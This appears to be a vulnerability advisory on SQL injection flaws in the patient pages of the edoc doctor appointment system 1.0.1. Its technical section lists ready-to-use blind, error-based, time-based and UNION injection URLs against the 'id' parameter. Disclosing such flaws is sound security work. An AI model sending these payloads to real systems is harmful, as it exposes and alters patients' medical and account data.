The provided content describes multiple SQL injection vulnerabilities in the "edoc-doctor-appointment-system" version 1.0.1.

**Root Cause:** The application fails to properly sanitize user-supplied input before using it in SQL queries.

**Weaknesses/Vulnerabilities:**
- SQL Injection: The application is vulnerable to SQL injection attacks in the following files:
    - `/patient/doctors.php`
    - `/patient/booking.php`
    - `/patient/settings.php`
- The vulnerable parameters are `id` and `action`.

**Impact of Exploitation:**
- Attackers can bypass authentication and authorization mechanisms to access unauthorized data.
- Attackers can read sensitive data from the database, modify data, or potentially gain control over the server.
- The identified vulnerabilities can be exploited by performing Blind SQL injection, Error-based injection, Time-based injection, and UNION query injection techniques.

**Attack Vectors:**
- The vulnerabilities can be exploited remotely via HTTP requests.
- The attacker can inject malicious SQL code through the `id` parameter in the identified files.

**Required Attacker Capabilities/Position:**
- The attacker needs to be able to send HTTP requests to the server.
- Basic knowledge of SQL injection techniques and the target database structure is required.
- The attacker needs to log in as patient to perform the SQL injection vulnerability.

**Technical Details:**

The following SQL injection techniques were used for exploitation:
   - **Blind SQL Injection:**
     - Payload example: `http://ip/patient/doctors.php?action=view&id=1' AND (SELECT 7788 FROM (SELECT(SLEEP(5)))gIPf)-- MVmI`
   - **Error-based SQL Injection:**
        - Payload example: `http://www.doctor111.com:80/patient/booking.php?id=1 OR (SELECT 3032 FROM(SELECT COUNT(*),CONCAT(0x717a6a7071,(SELECT (ELT(3032=3032,1))),0x7170787a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)`
   - **Time-based SQL Injection:**
        - Payload example: `http://www.doctor111.com:80/patient/booking.php?id=1 AND (SELECT 8632 FROM (SELECT(SLEEP(5)))HCPI)`
   - **UNION query SQL injection**
        - Payload example: `http://www.doctor111.com:80/patient/booking.php?id=-4821 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x717a6a7071,0x4247754365636f69425457434250756e6877504d52795463504f436950496d726376685a64465049,0x7170787a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -`
